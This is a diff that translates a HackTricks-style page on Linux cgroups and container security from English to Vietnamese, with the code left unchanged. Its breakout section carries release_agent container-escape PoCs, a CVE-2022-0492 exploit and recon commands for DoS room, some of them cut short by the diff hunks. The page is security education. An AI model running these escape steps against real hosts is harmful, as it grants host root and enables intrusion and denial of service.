@@ -2,32 +2,32 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Overview
+## Tổng quan
 
-Linux **control groups** are the kernel mechanism used to group processes together for accounting, limiting, prioritization, and policy enforcement. If namespaces are mainly about isolating the view of resources, cgroups are mainly about governing **how much** of those resources a set of processes may consume and, in some cases, **which classes of resources** they may interact with at all. Containers rely on cgroups constantly, even when the user never looks at them directly, because almost every modern runtime needs a way to tell the kernel "these processes belong to this workload, and these are the resource rules that apply to them".
+**Control groups** của Linux là cơ chế trong kernel dùng để nhóm các tiến trình nhằm ghi nhận mức sử dụng, giới hạn, ưu tiên và thực thi chính sách. Nếu namespaces chủ yếu cô lập cách nhìn về tài nguyên, thì cgroups chủ yếu quản lý **mức độ** tài nguyên mà một nhóm tiến trình được phép sử dụng và trong một số trường hợp, **những loại tài nguyên nào** chúng có thể tương tác. Container liên tục dựa vào cgroups, ngay cả khi người dùng không trực tiếp thấy chúng, vì gần như mọi runtime hiện đại đều cần một cách để báo cho kernel biết: "các tiến trình này thuộc về workload này, và đây là các quy tắc tài nguyên áp dụng cho chúng".
 
-This is why container engines place a new container into its own cgroup subtree. Once the process tree is there, the runtime can cap memory, limit the number of PIDs, weight CPU usage, regulate I/O, and restrict device access. In a production environment, this is essential both for multi-tenant safety and for simple operational hygiene. A container without meaningful resource controls may be able to exhaust memory, flood the system with processes, or monopolize CPU and I/O in ways that make the host or neighboring workloads unstable.
+Đó là lý do các container engine đưa container mới vào một cây con cgroup riêng. Khi cây tiến trình đã nằm ở đó, runtime có thể giới hạn bộ nhớ, giới hạn số lượng PID, đặt trọng số sử dụng CPU, điều tiết I/O và hạn chế quyền truy cập thiết bị. Trong môi trường production, điều này thiết yếu cho cả tính an toàn của môi trường multi-tenant lẫn việc vận hành ổn định. Container không có các giới hạn tài nguyên phù hợp có thể làm cạn kiệt bộ nhớ, tạo ra quá nhiều tiến trình hoặc chiếm dụng CPU và I/O, khiến host hoặc các workload lân cận mất ổn định.
 
-From a security perspective, cgroups matter in two separate ways. First, bad or missing resource limits enable straightforward denial-of-service attacks. Second, some cgroup features, especially in older **cgroup v1** setups, have historically created powerful breakout primitives when they were writable from inside a container.
+Từ góc độ bảo mật, cgroups quan trọng theo hai cách riêng biệt. Thứ nhất, các giới hạn tài nguyên không phù hợp hoặc bị thiếu tạo điều kiện cho các cuộc tấn công denial-of-service đơn giản. Thứ hai, một số tính năng cgroup, đặc biệt trong các thiết lập **cgroup v1** cũ, từng tạo ra các primitive breakout mạnh khi có thể ghi vào chúng từ bên trong container.
 
-## v1 Vs v2
+## v1 so với v2
 
-There are two major cgroup models in the wild. **cgroup v1** exposes multiple controller hierarchies, and older exploit writeups often revolve around the weird and sometimes overly powerful semantics available there. **cgroup v2** introduces a more unified hierarchy and generally cleaner behavior. Modern distributions increasingly prefer cgroup v2, but mixed or legacy environments still exist, which means both models are still relevant when reviewing real systems.
+Hiện có hai mô hình cgroup chính. **cgroup v1** cung cấp nhiều hệ phân cấp controller, và các bài viết về exploit cũ thường xoay quanh những ngữ nghĩa khác thường, đôi khi quá mạnh, có ở đó. **cgroup v2** đưa ra hệ phân cấp thống nhất hơn và nhìn chung hoạt động rõ ràng hơn. Các bản phân phối hiện đại ngày càng ưu tiên cgroup v2, nhưng môi trường hỗn hợp hoặc cũ vẫn tồn tại, nên cả hai mô hình vẫn cần được xem xét khi đánh giá hệ thống thực tế.
 
-The difference matters because some of the most famous container breakout stories, such as abuses of **`release_agent`** in cgroup v1, are tied very specifically to older cgroup behavior. A reader who sees a cgroup exploit on a blog and then blindly applies it to a modern cgroup v2-only system is likely to misunderstand what is actually possible on the target.
+Sự khác biệt này rất quan trọng vì một số câu chuyện container breakout nổi tiếng nhất, chẳng hạn như lạm dụng **`release_agent`** trong cgroup v1, gắn liền với hành vi cgroup cũ. Người đọc thấy một cgroup exploit trên blog rồi áp dụng máy móc vào hệ thống hiện đại chỉ dùng cgroup v2 có thể sẽ hiểu sai những gì thực sự khả thi trên mục tiêu.
 
-## Inspection
+## Kiểm tra
 
-The quickest way to see where your current shell sits is:
+Cách nhanh nhất để xem shell hiện tại của bạn nằm ở đâu là:
 
 ```bash
 cat /proc/self/cgroup
 findmnt -T /sys/fs/cgroup
 ```
 
-The `/proc/self/cgroup` file shows the cgroup paths associated with the current process. On a modern cgroup v2 host, you will often see a unified entry. On older or hybrid hosts, you may see multiple v1 controller paths. Once you know the path, you can inspect the corresponding files under `/sys/fs/cgroup` to see limits and current usage.
+Tệp `/proc/self/cgroup` hiển thị các đường dẫn cgroup gắn với tiến trình hiện tại. Trên máy chủ cgroup v2 hiện đại, bạn thường sẽ thấy một mục thống nhất. Trên máy chủ cũ hơn hoặc máy chủ chạy chế độ kết hợp, bạn có thể thấy nhiều đường dẫn bộ điều khiển v1. Khi đã biết đường dẫn, bạn có thể kiểm tra các tệp tương ứng trong `/sys/fs/cgroup` để xem giới hạn và mức sử dụng hiện tại.
 
-On a cgroup v2 host, the following commands are useful:
+Trên máy chủ cgroup v2, các lệnh sau rất hữu ích:
 
 ```bash
 ls -l /sys/fs/cgroup
@@ -35,11 +35,11 @@ cat /sys/fs/cgroup/cgroup.controllers
 cat /sys/fs/cgroup/cgroup.subtree_control
 ```
 
-These files reveal which controllers exist and which ones are delegated to child cgroups. This delegation model matters in rootless and systemd-managed environments, where the runtime may only be able to control the subset of cgroup functionality that the parent hierarchy actually delegates.
+Các tệp này cho biết những controller nào tồn tại và controller nào được ủy quyền cho các cgroup con. Mô hình ủy quyền này rất quan trọng trong môi trường rootless và do systemd quản lý, nơi runtime có thể chỉ kiểm soát được một phần chức năng cgroup mà phân cấp cha thực sự ủy quyền.
 
-## Lab
+## Bài thực hành
 
-One way to observe cgroups in practice is to run a memory-limited container:
+Một cách để quan sát cgroups trong thực tế là chạy một container bị giới hạn bộ nhớ:
 
 ```bash
 docker run --rm -it --memory=256m debian:stable-slim bash
@@ -47,42 +47,42 @@ cat /proc/self/cgroup
 cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
 ```
 
-You can also try a PID-limited container:
+Bạn cũng có thể thử một container bị giới hạn PID:
 
 ```bash
 docker run --rm -it --pids-limit=64 debian:stable-slim bash
 cat /sys/fs/cgroup/pids.max 2>/dev/null
 ```
 
-These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.
+Các ví dụ này hữu ích vì giúp liên hệ flag của runtime với giao diện tệp của kernel. Runtime không thực thi quy tắc bằng phép màu; nó ghi các thiết lập cgroup liên quan rồi để kernel thực thi chúng đối với cây tiến trình.
 
-## Runtime Usage
+## Cách sử dụng Runtime
 
-Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. The differences are usually not about whether they use cgroups, but about **which defaults they choose**, **how they interact with systemd**, **how rootless delegation works**, and **how much of the configuration is controlled at the engine level versus the orchestration level**.
+Docker, Podman, containerd và CRI-O đều dựa vào cgroups trong hoạt động bình thường. Những điểm khác biệt thường không nằm ở việc chúng có dùng cgroups hay không, mà ở **các giá trị mặc định chúng chọn**, **cách chúng tương tác với systemd**, **cách hoạt động của việc ủy quyền rootless** và **mức độ cấu hình được kiểm soát ở cấp engine so với cấp điều phối**.
 
-In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.
+Trong Kubernetes, các yêu cầu và giới hạn tài nguyên cuối cùng trở thành cấu hình cgroup trên node. Đường đi từ Pod YAML đến việc thực thi ở kernel đi qua kubelet, CRI runtime và OCI runtime, nhưng cgroups vẫn là cơ chế kernel cuối cùng áp dụng quy tắc. Trong các môi trường Incus/LXC, cgroups cũng được sử dụng rộng rãi, đặc biệt vì system container thường có cây tiến trình phong phú hơn và kỳ vọng vận hành giống VM hơn.
 
-## Misconfigurations And Breakouts
+## Cấu hình sai và thoát khỏi Container
 
-The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.
+Câu chuyện bảo mật cgroup kinh điển xoay quanh cơ chế **`release_agent` có thể ghi của cgroup v1**. Trong mô hình đó, nếu attacker có thể ghi vào đúng các tệp cgroup, bật `notify_on_release` và kiểm soát đường dẫn được lưu trong `release_agent`, kernel có thể thực thi một đường dẫn do attacker chọn trong các namespace ban đầu trên host khi cgroup trở nên trống. Đó là lý do các bài viết cũ tập trung nhiều vào khả năng ghi của controller cgroup, các tùy chọn mount và điều kiện namespace/capability.
 
-Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.
+Ngay cả khi không có `release_agent`, sai sót về cgroup vẫn đáng lưu tâm. Quyền truy cập thiết bị quá rộng có thể khiến container truy cập được các thiết bị của host. Thiếu giới hạn bộ nhớ và PID có thể biến một lần thực thi mã đơn giản thành DoS trên host. Việc ủy quyền cgroup yếu trong các tình huống rootless cũng có thể khiến defender lầm tưởng rằng đã có hạn chế, trong khi runtime thực tế chưa từng có khả năng áp dụng nó.
 
-### `release_agent` Background
+### Bối cảnh về `release_agent`
 
-The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.
+Kỹ thuật `release_agent` chỉ áp dụng cho **cgroup v1**. Ý tưởng cơ bản là khi tiến trình cuối cùng trong cgroup thoát và `notify_on_release=1` được thiết lập, kernel sẽ thực thi chương trình có đường dẫn được lưu trong `release_agent`. Việc thực thi đó diễn ra trong **các namespace ban đầu trên host**, khiến `release_agent` có thể ghi trở thành một primitive thoát khỏi container.
 
-For the technique to work, the attacker generally needs:
+Để kỹ thuật này hoạt động, attacker thường cần:
 
-- a writable **cgroup v1** hierarchy
-- the ability to create or use a child cgroup
-- the ability to set `notify_on_release`
-- the ability to write a path into `release_agent`
-- a path that resolves to an executable from the host point of view
+- một hệ phân cấp **cgroup v1** có thể ghi
+- khả năng tạo hoặc sử dụng cgroup con
+- khả năng thiết lập `notify_on_release`
+- khả năng ghi một đường dẫn vào `release_agent`
+- một đường dẫn trỏ đến tệp thực thi khi xét từ góc nhìn của host
 
-### Classic PoC
+### PoC kinh điển
 
-The historical one-liner PoC is:<sup>[[1]](#references)</sup>
+PoC một dòng mang tính lịch sử là:<sup>[[1]](#references)</sup>
 
 ```bash
 d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
@@ -101,13 +101,13 @@ sleep 1
 cat /o
 ```
 
-This PoC writes a payload path into `release_agent`, triggers cgroup release, and then reads back the output file generated on the host.
+PoC này ghi đường dẫn payload vào `release_agent`, kích hoạt cgroup release, rồi đọc lại tệp đầu ra được tạo trên host.
 
-### Readable Walk-Through
+### Diễn giải dễ hiểu
 
-The same idea is easier to understand when broken into steps.<sup>[[1]](#references)</sup>
+Cùng ý tưởng đó sẽ dễ hiểu hơn khi được chia thành các bước.<sup>[[1]](#references)</sup>
 
-1. Create and prepare a writable cgroup:
+1. Tạo và chuẩn bị một cgroup có thể ghi:
 
 ```bash
 mkdir /tmp/cgrp
@@ -116,14 +116,14 @@ mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
 
-2. Identify the host path that corresponds to the container filesystem:
+2. Xác định đường dẫn trên host tương ứng với hệ thống tệp của container:
 
 ```bash
 host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
 
-3. Drop a payload that will be visible from the host path:
+3. Đặt một payload có thể nhìn thấy từ đường dẫn trên host:
 
 ```bash
 cat <<'EOF' > /cmd
@@ -133,7 +133,7 @@ EOF
 chmod +x /cmd
 ```
 
-4. Trigger execution by making the cgroup empty:
+4. Kích hoạt thực thi bằng cách làm cho cgroup trống:
 
 ```bash
 sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
@@ -141,11 +141,11 @@ sleep 1
 cat /output
 ```
 
-The effect is host-side execution of the payload with host root privileges. In a real exploit, the payload usually writes a proof file, spawns a reverse shell, or modifies host state.
+Tác động là payload được thực thi phía host với quyền root của host. Trong một exploit thực tế, payload thường tạo một file chứng minh, mở reverse shell hoặc sửa đổi trạng thái của host.
 
-### Relative Path Variant Using `/proc/<pid>/root`
+### Biến thể đường dẫn tương đối sử dụng `/proc/<pid>/root`
 
-In some environments, the host path to the container filesystem is not obvious or is hidden by the storage driver. In that case the payload path can be expressed through `/proc/<pid>/root/...`, where `<pid>` is a host PID belonging to a process in the current container. That is the basis of the relative-path brute-force variant:<sup>[[2]](#references)</sup>
+Trong một số môi trường, đường dẫn trên host tới filesystem của container không rõ ràng hoặc bị storage driver ẩn đi. Khi đó, có thể biểu diễn đường dẫn tới payload thông qua `/proc/<pid>/root/...`, trong đó `<pid>` là PID trên host của một process thuộc container hiện tại. Đây là cơ sở của biến thể brute-force đường dẫn tương đối:<sup>[[2]](#references)</sup>
 
 ```bash
 #!/bin/sh
@@ -195,13 +195,13 @@ sleep 1
 cat ${OUTPUT_PATH}
 ```
 
-The relevant trick here is not the brute force itself but the path form: `/proc/<pid>/root/...` lets the kernel resolve a file inside the container filesystem from the host namespace, even when the direct host storage path is not known ahead of time.
+Thủ thuật quan trọng ở đây không phải bản thân việc brute force mà là dạng đường dẫn: `/proc/<pid>/root/...` cho phép kernel phân giải một tệp bên trong filesystem của container từ host namespace, ngay cả khi chưa biết trước đường dẫn lưu trữ trực tiếp trên host.
 
-### CVE-2022-0492 Variant
+### Biến thể CVE-2022-0492
 
-In 2022, CVE-2022-0492 showed that writing to `release_agent` in cgroup v1 was not correctly checking for `CAP_SYS_ADMIN` in the **initial** user namespace. This made the technique far more reachable on vulnerable kernels because a container process that could mount a cgroup hierarchy could write `release_agent` without already being privileged in the host user namespace.<sup>[[3]](#references)</sup>
+Năm 2022, CVE-2022-0492 cho thấy thao tác ghi vào `release_agent` trong cgroup v1 không kiểm tra chính xác `CAP_SYS_ADMIN` trong user namespace **initial**. Điều này giúp kỹ thuật dễ thực hiện hơn nhiều trên các kernel có lỗ hổng, vì một tiến trình trong container có thể mount một phân cấp cgroup rồi ghi vào `release_agent` mà không cần có đặc quyền trong user namespace của host.<sup>[[3]](#references)</sup>
 
-Minimal exploit:
+Exploit tối giản:
 
 ```bash
 apk add --no-cache util-linux
@@ -215,9 +215,9 @@ unshare -UrCm sh -c '
 '
 ```
 
-On a vulnerable kernel, the host executes `/proc/self/exe` with host root privileges.
+Trên một kernel có lỗ hổng, host thực thi `/proc/self/exe` với quyền root của host.
 
-For practical abuse, start by checking whether the environment still exposes writable cgroup-v1 paths or dangerous device access:
+Để khai thác thực tế, trước tiên hãy kiểm tra xem môi trường còn để lộ các đường dẫn cgroup-v1 có thể ghi hoặc quyền truy cập thiết bị nguy hiểm hay không:
 
 ```bash
 mount | grep cgroup
@@ -226,14 +226,14 @@ find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
 ls -l /dev | head -n 50
 ```
 
-If `release_agent` is present and writable, you are already in legacy-breakout territory:
+Nếu `release_agent` tồn tại và có thể ghi, thì bạn đã ở trong vùng legacy-breakout:
 
 ```bash
 find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
 find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
 ```
 
-If the cgroup path itself does not yield an escape, the next practical use is often denial of service or reconnaissance:
+Nếu bản thân đường dẫn cgroup không dẫn đến escape, cách sử dụng thực tế tiếp theo thường là denial of service hoặc reconnaissance:
 
 ```bash
 cat /sys/fs/cgroup/pids.max 2>/dev/null
@@ -241,11 +241,11 @@ cat /sys/fs/cgroup/memory.max 2>/dev/null
 cat /sys/fs/cgroup/cpu.max 2>/dev/null
 ```
 
-These commands quickly tell you whether the workload has room to fork-bomb, consume memory aggressively, or abuse a writable legacy cgroup interface.
+Các lệnh này nhanh chóng cho bạn biết workload có thể fork-bomb, tiêu thụ bộ nhớ mạnh tay hoặc lạm dụng giao diện cgroup legacy có quyền ghi hay không.
 
-## Checks
+## Kiểm tra
 
-When reviewing a target, the purpose of the cgroup checks is to learn which cgroup model is in use, whether the container sees writable controller paths, and whether old breakout primitives such as `release_agent` are even relevant.
+Khi đánh giá một mục tiêu, mục đích của các kiểm tra cgroup là tìm hiểu mô hình cgroup nào đang được sử dụng, container có thấy các đường dẫn controller có quyền ghi hay không, và liệu các primitive breakout cũ như `release_agent` có còn liên quan hay không.
 
 ```bash
 cat /proc/self/cgroup                                      # Current process cgroup placement
@@ -254,29 +254,28 @@ find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 br
 cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
 ```
 
-What is interesting here:
+Điều gì đáng chú ý ở đây:
 
-- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
-- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
-- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.
+- Nếu `mount | grep cgroup` hiển thị **cgroup v1**, các bài viết cũ về thoát khỏi container sẽ phù hợp hơn.
+- Nếu `release_agent` tồn tại và có thể truy cập, đây là dấu hiệu đáng để điều tra sâu hơn ngay lập tức.
+- Nếu hệ thống phân cấp cgroup hiển thị có thể ghi và container cũng có capabilities mạnh, môi trường này cần được xem xét kỹ hơn nhiều.
 
-If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.
+Nếu phát hiện **cgroup v1**, các mount controller có thể ghi và container cũng có capabilities mạnh hoặc được bảo vệ yếu bằng seccomp/AppArmor, thì tổ hợp này cần được chú ý cẩn thận. cgroups thường bị xem là chủ đề quản lý tài nguyên nhàm chán, nhưng trong lịch sử, chúng đã góp mặt trong một số chuỗi thoát khỏi container mang tính giáo dục nhất, chính vì ranh giới giữa “kiểm soát tài nguyên” và “ảnh hưởng đến host” không phải lúc nào cũng rõ ràng như mọi người vẫn nghĩ.
 
 ## Runtime Defaults
 
-| Runtime / platform | Default state | Default behavior | Common manual weakening |
+| Runtime / platform | Trạng thái mặc định | Hành vi mặc định | Các cách làm suy yếu thường gặp |
 | --- | --- | --- | --- |
-| Docker Engine | Enabled by default | Containers are placed in cgroups automatically; resource limits are optional unless set with flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
-| Podman | Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
-| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | omitting resource requests/limits, privileged device access, host-level runtime misconfiguration |
-| containerd / CRI-O | Enabled by default | cgroups are part of normal lifecycle management | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |
+| Docker Engine | Được bật theo mặc định | Container tự động được đưa vào cgroups; giới hạn tài nguyên là tùy chọn, trừ khi được thiết lập bằng flags | bỏ qua `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
+| Podman | Được bật theo mặc định | `--cgroups=enabled` là mặc định; giá trị mặc định của cgroup namespace thay đổi tùy phiên bản cgroup (`private` trên cgroup v2, `host` trên một số cấu hình cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, nới lỏng quyền truy cập thiết bị, `--privileged` |
+| Kubernetes | Được bật theo mặc định thông qua runtime | Pod và container được runtime của node đưa vào cgroups; khả năng kiểm soát tài nguyên chi tiết phụ thuộc vào `resources.requests` / `resources.limits` | bỏ qua requests/limits tài nguyên, quyền truy cập thiết bị ở mức privileged, cấu hình sai runtime ở cấp host |
+| containerd / CRI-O | Được bật theo mặc định | cgroups là một phần trong quy trình quản lý vòng đời thông thường | cấu hình runtime trực tiếp làm nới lỏng quyền kiểm soát thiết bị hoặc để lộ các giao diện cgroup v1 cũ có thể ghi |
 
-The important distinction is that **cgroup existence** is usually default, while **useful resource constraints** are often optional unless explicitly configured.
+Điểm khác biệt quan trọng là **sự tồn tại của cgroup** thường là mặc định, còn **các giới hạn tài nguyên hữu ích** thường là tùy chọn, trừ khi được cấu hình rõ ràng.
 
 ## References
 
-- [1] [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
-- [2] [Privileged Container Escape - Control Groups release_agent](https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html)
-- [3] [New Linux Vulnerability CVE-2022-0492 Affecting Cgroups: Can Containers Escape?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
-
+- [1] [Tìm hiểu về các cách thoát khỏi Docker container](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
+- [2] [Thoát khỏi container privileged - Control Groups release_agent](https://blog.ajxchapman.com/posts/2020/11/19/privileged-container-escape.html)
+- [3] [Lỗ hổng Linux mới CVE-2022-0492 ảnh hưởng đến Cgroups: Container có thể thoát ra ngoài không?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
 {{#include ../../../../banners/hacktricks-training.md}}
